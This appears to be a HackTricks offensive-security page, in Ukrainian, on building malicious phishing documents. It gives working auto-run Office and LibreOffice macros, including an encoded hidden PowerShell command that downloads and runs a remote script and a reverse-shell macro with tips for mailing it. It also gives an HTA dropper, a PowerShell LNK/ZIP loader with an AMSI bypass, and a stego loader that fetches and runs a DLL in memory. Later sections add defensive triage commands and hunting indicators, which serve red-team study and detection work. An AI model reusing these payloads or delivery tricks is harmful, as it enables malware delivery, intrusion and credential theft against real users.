# Фішингові файли та документи

{{#include ../../banners/hacktricks-training.md}}

## Документи Office

Microsoft Word перевіряє дані файлу перед його відкриттям. Перевірка даних виконується шляхом ідентифікації структури даних відповідно до стандарту OfficeOpenXML. Якщо під час ідентифікації структури даних виникає помилка, файл, що аналізується, не буде відкрито.

Зазвичай файли Word, що містять макроси, мають розширення `.docm`. Однак файл можна перейменувати, змінивши розширення, і він усе одно зможе виконувати макроси.\
Наприклад, файл RTF не підтримує макроси за задумом, але файл DOCM, перейменований на RTF, оброблятиметься Microsoft Word і зможе виконувати макроси.\
Ті самі внутрішні механізми застосовуються до всіх програм пакета Microsoft Office (Excel, PowerPoint тощо).

За допомогою наведеної нижче команди можна перевірити, файли з якими розширеннями запускатимуться в деяких програмах Office:

```bash
assoc | findstr /i "word excel powerp"
```

Файли DOCX, що посилаються на віддалений шаблон (File –Options –Add-ins –Manage: Templates –Go), який містить макроси, також можуть «виконувати» макроси.

### Зовнішнє завантаження зображення

Перейдіть до: _Вставлення --> Експрес-блоки --> Поле_\
_**Категорії**: Посилання та перехресні посилання, **Імена полів**: includePicture, і **Ім’я файлу або URL-адреса**:_ http://<ip>/whatever

![Документи Office — зовнішнє завантаження зображення: перейдіть до: Вставлення -- Експрес-блоки -- Поле](<../../images/image (155).png>)

### Бекдор через макроси

За допомогою макросів можна запускати довільний код із документа.

#### Функції автозапуску

Що частіше вони трапляються, то більша ймовірність, що їх виявить AV.

- AutoOpen()
- Document_Open()

#### Приклади коду макросів

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Видалення метаданих вручну

Перейдіть до **File > Info > Inspect Document > Inspect Document**, щоб відкрити Document Inspector. Натисніть **Inspect**, а потім **Remove All** поруч із **Document Properties and Personal Information**.

#### Розширення Doc

Після завершення виберіть список **Save as type** і змініть формат із **`.docx`** на Word 97-2003 **`.doc`**.\
Зробіть це, тому що **не можна зберігати макроси у файлі `.docx`**, а розширення **`.docm`** з підтримкою макросів має **погану репутацію** (наприклад, на значку мініатюри є великий `!`, а деякі веб- та поштові шлюзи повністю блокують такі файли). Тому застаріле розширення **`.doc`** — найкращий компроміс.

#### Генератори шкідливих макросів

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Макроси LibreOffice ODT з автозапуском (Basic)

Документи LibreOffice Writer можуть містити макроси Basic, які автоматично запускаються під час відкриття файлу, якщо прив’язати макрос до події **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Простий макрос зворотного shell має такий вигляд:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Зверніть увагу на подвоєні лапки (`""`) усередині рядка — LibreOffice Basic використовує їх для екранування буквальних лапок, тож payload-и, які закінчуються на `...==""")`, зберігають збалансованість внутрішньої команди та аргументу Shell.

Поради щодо доставки:

- Збережіть файл у форматі `.odt` і прив’яжіть макрос до події документа, щоб він запускався одразу після відкриття.
- Під час надсилання електронного листа за допомогою `swaks` використовуйте `--attach @resume.odt` (`@` потрібен, щоб як вкладення надіслалися байти файлу, а не рядок із назвою файлу). Це критично під час зловживання SMTP-серверами, які приймають довільних одержувачів `RCPT TO` без перевірки.

## HTA Files

HTA — це програма для Windows, яка **поєднує HTML і мови сценаріїв (як-от VBScript і JScript)**. Вона створює інтерфейс користувача та виконується як «повністю довірена» програма, не маючи обмежень моделі безпеки браузера.

HTA запускається за допомогою **`mshta.exe`**, який зазвичай **встановлюється** разом з **Internet Explorer**, тож **`mshta` залежить від IE**. Отже, якщо Internet Explorer видалено, HTA не зможуть виконуватися.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Підроблені картки вкладень в HTML-листах

HTML-лист може імітувати вбудовану картку попереднього перегляду вкладення провайдера, не містячи справжнього вкладення. Talos спостерігала картку Gmail, відтворену з чотирьох вбудованих PNG-частин MIME, закодованих у Base64. Увесь візуальний елемент був обгорнутий одним anchor-елементом, а значення одержувача в `?m=<target-id>` давало змогу відстежувати кожного одержувача окремо. Посилання починалося з `//`, а не з `http://` чи `https://`; браузери обробляють цей відносний до протоколу формат, але екстрактори URL, які шукають лише повністю кваліфіковані URL, можуть його пропустити.<sup>[[11]](#references)</sup>

Під час аналізу перевіряйте сирий MIME, а не покладайтеся на відображений список вкладень. Відтворіть, як вбудовані частини зображення утворюють візуальну картку, визначте anchor-елемент, що її охоплює, і нормалізуйте відносні до протоколу значення `href` перед вилученням URL.<sup>[[11]](#references)</sup>

Щодо підміни відправника конверта/заголовка та тестування вирівнювання DMARC див. [заходи протидії підміні SMTP-пошти](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Примусова автентифікація NTLM

Є кілька способів **віддалено примусити автентифікацію NTLM**. Наприклад, можна додати **невидимі зображення** до листів або HTML-сторінок, які відкриє користувач (навіть HTTP MitM?). Або надіслати жертві **шлях до файлів**, який **спричинить** **автентифікацію** лише від **відкриття теки**.

**Перевірте ці та інші ідеї на таких сторінках:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Не забувайте, що можна не лише викрасти хеш або облікові дані автентифікації, а й **виконувати атаки NTLM relay**:

- [**Атаки NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay до сертифікатів)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## Завантажувачі LNK + payload-и, вбудовані в ZIP (безфайловий ланцюжок)

Надзвичайно ефективні кампанії доставляють ZIP-архів із двома легітимними документами-приманками (PDF/DOCX) і шкідливим файлом .lnk. Хитрість у тому, що власне PowerShell-завантажувач зберігається в сирих байтах ZIP після унікального маркера, а файл .lnk вирізає його та запускає повністю в пам’яті.<sup>[[2]](#references)</sup>

Типовий процес, реалізований однорядковою командою PowerShell у файлі .lnk:

1) Знайти оригінальний ZIP у поширених шляхах: Desktop, Downloads, Documents, %TEMP%, %ProgramData% і в батьківській теці поточного робочого каталогу.
2) Прочитати байти ZIP і знайти жорстко заданий маркер (наприклад, xFIQCV). Усе після маркера є вбудованим PowerShell-payload.
3) Скопіювати ZIP у %ProgramData%, розпакувати його там і відкрити документ-приманку .docx, щоб усе виглядало легітимно.
4) Обійти AMSI для поточного процесу: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Деобфускувати наступний етап (наприклад, видалити всі символи #) і виконати його в пам’яті.

Приклад каркаса PowerShell для вилучення та запуску вбудованого етапу:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Нотатки
- Доставка часто зловживає субдоменами авторитетних PaaS (наприклад, *.herokuapp.com) і може обмежувати доступ до payload (віддавати нешкідливі ZIP-файли залежно від IP/UA).
- На наступному етапі часто розшифровується base64/XOR shellcode, який виконується через Reflection.Emit + VirtualAlloc, щоб мінімізувати артефакти на диску.

Закріплення, використане в тому самому ланцюжку
- Перехоплення COM TypeLib для елемента керування Microsoft Web Browser, щоб IE/Explorer або будь-яка програма, що його вбудовує, автоматично повторно запускала payload.<sup>[[2]](#references)[[4]](#references)</sup> Докладніше та готові до використання команди наведено тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Пошук/IOC
- ZIP-файли з доданим до даних архіву ASCII-маркером (наприклад, xFIQCV).
- .lnk, який перебирає батьківські папки та папки користувача, щоб знайти ZIP-файл і відкрити документ-приманку.
- Втручання в AMSI через [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Тривалі ділові переписки, що завершуються посиланнями на надійних доменах PaaS.

## Маскування під документ у LNK із відкриттям приманки → закріплення через заплановане завдання → trusted CPL side-loading

Інший поширений шаблон — **ярлик `.lnk`, замаскований під документ**, який одразу відкриває нешкідливу приманку, а справжній ланцюжок розгортає у фоновому режимі.<sup>[[3]](#references)</sup>

Спостережуваний алгоритм:
1. Ярлик **маскується під PDF** і використовує `conhost.exe` або подібний проксі-процес для запуску обфускованого завантажувача PowerShell.
2. Команда PowerShell розбиває очевидні токени (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), щоб прості засоби виявлення, які шукають `iwr`, `gci`, `ren`, `cpi` або `schtasks`, пропустили її.
3. Stager спочатку завантажує **документ-приманку**, відкриває його для жертви, а потім у фоновому режимі відновлює шкідливі файли.
4. Payload можуть записуватися з **нехарактерними розширеннями**, а потім перейменовуватися зі зрізанням символів-заповнювачів, що затримує появу очевидних артефактів `.exe` / `.cpl`.
5. Закріплення забезпечується **запланованим завданням, що запускається щохвилини** і запускає довірений хост-бінарний файл із доступного для запису користувачем шляху.

Основні ознаки для пошуку цього шаблону:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Корисне компонування staging, яке варто розпізнавати:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` або `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Чому другий етап важко виявити

У кейсі Rapid7 заплановане завдання неодноразово запускало **`Fondue.exe`** з `C:\Users\Public\`. Оскільки поруч було розміщено **`APPWIZ.cpl`**, який експортував **`RunFODW`**, довірений бінарний файл Microsoft завантажував CPL зловмисника замість легітимної системної копії.

Потім CPL:
- Зчитував blob **AES-256-CBC** із `C:\Windows\Tasks\editor.dat`
- Розшифровував його за допомогою **Windows CNG / `bcrypt.dll`**
- Виділяв виконувану пам’ять і копіював туди розшифрований shellcode
- Виконував його опосередковано, передаючи вказівник на shellcode як callback для **`EnumUILanguagesW`**

Останній крок варто шукати окремо: malware часто уникає прямого переходу `((void(*)())buf)()` і натомість зловживає **легітимною WinAPI-функцією, що приймає callback**, щоб передати виконання.

Розшифрований payload у цій кампанії був shellcode **Donut**, який завантажував кінцевий PE повністю в пам’ять і пропатчував **AMSI/WLDP/ETW** у поточному процесі перед передаванням виконання. Докладніші нотатки про side-loading і постобробку в пам’яті дивіться тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Практичні орієнтири для пошуку:
- `.lnk`, що запускає `powershell.exe` або `conhost.exe`, після чого відкривається видимий документ-приманка.
- Короткочасні завантаження до **`C:\Users\Public\`**, за якими відразу відбувається перейменування файлів із безглуздими розширеннями.
- Заплановані завдання з непомітними назвами на кшталт `GoogleErrorReport`, які виконують файли з **каталогів, доступних для запису користувачам**.
- Довірені бінарні файли, що завантажують файли **`.cpl` / `.dll`** з того самого несистемного каталогу.
- Текстові blob-файли Base64, записані до **`C:\Windows\Tasks\`**, а потім зчитані модулем, завантаженим через side-loading.

## Payload-и, розмежовані стеганографічними маркерами в зображеннях (PowerShell stager)

Сучасні ланцюжки завантаження доставляють обфускований JavaScript/VBS, який декодує та запускає PowerShell stager у форматі Base64. Цей stager завантажує зображення (часто GIF), що містить приховану як звичайний текст .NET DLL у форматі Base64 між унікальними маркерами початку й кінця. Скрипт шукає ці роздільники (приклади, помічені в реальних атаках: «<<sudo_png>> … <<sudo_odt>>>»), витягує текст між ними, декодує Base64 у байти, завантажує збірку в пам’ять і викликає відомий метод входу, передаючи URL C2.<sup>[[5]](#references)</sup>

Робочий процес
- Етап 1: Архівований JS/VBS dropper → декодує вбудований Base64 → запускає PowerShell stager з параметрами -nop -w hidden -ep bypass.
- Етап 2: PowerShell stager → завантажує зображення, вирізає Base64 між маркерами, завантажує .NET DLL у пам’ять і викликає її метод (наприклад, VAI), передаючи URL C2 та параметри.
- Етап 3: Loader отримує кінцевий payload і зазвичай впроваджує його за допомогою process hollowing у довірений бінарний файл (часто MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Дізнайтеся більше про process hollowing і proxy execution через довірені утиліти тут:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Приклад PowerShell для вилучення DLL із зображення та виклику методу .NET у пам’яті:

<details>
<summary>Екстрактор і завантажувач stego payload для PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Нотатки
- Це ATT&CK T1027.003 (стеганографія/приховування маркерів).<sup>[[6]](#references)</sup> Маркери відрізняються між кампаніями.
- Обхід AMSI/ETW і деобфускацію рядків зазвичай виконують перед завантаженням збірки.
- Hunting: скануйте завантажені зображення на наявність відомих роздільників; виявляйте PowerShell, що звертається до зображень і відразу декодує Base64 blobs.

Див. також stego tools і техніки carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Повторюваний початковий етап — невеликий, сильно обфускований файл `.js` або `.vbs`, доставлений в архіві. Його єдина мета — декодувати вбудований рядок Base64 і запустити PowerShell із параметрами `-nop -w hidden -ep bypass`, щоб завантажити наступний етап через HTTPS.<sup>[[5]](#references)</sup>

Схематична логіка (абстрактно):
- Прочитати вміст власного файла
- Знайти blob Base64 між рядками-сміттям
- Декодувати в ASCII PowerShell
- Виконати за допомогою `wscript.exe`/`cscript.exe`, викликавши `powershell.exe`

Ознаки для Hunting
- Архівовані вкладення JS/VBS, що запускають `powershell.exe` із `-enc`/`FromBase64String` у командному рядку.
- `wscript.exe`, що запускає `powershell.exe -nop -w hidden` з тимчасових каталогів користувача.

## Документи MSC як контейнери для виконання (GrimResource)

Файли Microsoft Management Console (`.msc`) — це XML-визначення консолі, які зазвичай відкриваються через `mmc.exe`. **GrimResource** використовує посилання `StringTable` на ресурс `apds.dll`, що містить старий XSS-примітив. У результаті відкриття користувачем спеціально створеної консолі запускає JavaScript усередині `mmc.exe`. Виявлені зразки поєднували обфускацію на основі `transformNode` з **DotNetToJScript**, щоб створити .NET payload без звичного шляху через макроси Office.<sup>[[9]](#references)</sup>

Для статичного тріажу розглядайте недовірений MSC як текст і **не** відкривайте його подвійним клацанням:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Високоінформативними runtime-поворотами є завантаження CLR або скриптових компонентів через `mmc.exe`, створення мережевих з’єднань або запуск `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` чи неочікуваного виконуваного файла. Цей формат легітимний, тому правила виявлення мають корелювати **походження + підозрілий XML/скриптовий вміст + поведінку `mmc.exe`**, а не блокувати всі MSC.<sup>[[9]](#references)</sup>

## PDF/QR-перенаправлювачі та видача payload за умовами

PDF не обов’язково має містити експлойт, щоб бути корисним. У нещодавніх кампаніях у документи, що мають нешкідливий вигляд, додають **QR-код або звичайне посилання**, переводять браузерну сесію за межі засобів контролю пошти й персоналізують адресу призначення, додаючи адресу одержувача. Microsoft задокументувала PDF-файли 2025 року з QR URL, унікальними для кожного одержувача, які вели до інфраструктури викрадення облікових даних RaccoonO365; у паралельному ланцюжку використовували перевірку IP/середовища, щоб повертати вибраним відвідувачам шлях JavaScript/MSI, а сканерам або клієнтам, доступ до яких заборонено, — нешкідливий PDF.<sup>[[10]](#references)</sup>

Під час первинного аналізу перевіряйте і дії PDF, і відрендерені QR-коди. QR-код може бути намальований векторно, а не збережений як зображення, яке можна видобути, тому растеризуйте кожну сторінку та видобувайте вбудовані зображення:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Перевіряйте декодовані адреси призначення та перенаправлення з ізольованої системи аналізу без автентифікації. Корисні ознаки для пошуку: PDF-файли лише з QR-кодом і майже порожнім текстом листа, адреса електронної пошти одержувача в параметрі запиту, кілька перенаправлень через надійні хостинги та різний вміст залежно від IP-адреси, геолокації, cookie, referrer або user agent. Порівнюйте запити з контрольованими профілями, оскільки під час одного запиту із sandbox може надійти лише приманка.<sup>[[10]](#references)</sup>

## Файли Windows для викрадення NTLM-хешів

Перегляньте сторінку про **місця для викрадення облікових даних NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – макрос LibreOffice → вебшелл IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – кампанія ZipLine: складна фішингова атака, спрямована на компанії США](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: відстеження тактик Dropping Elephant у ланцюжку завантажувача з китайською тематикою](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Перехоплення TypeLib – нова техніка закріплення COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – завантажувач PhantomVAI доставляє різні засоби викрадення інформації](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console для початкового доступу та ухилення від виявлення](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – зловмисники використовують податковий сезон для проведення фішингових кампаній на податкову тематику](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – ланцюжок доставки UAT-11587 і бекдор Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
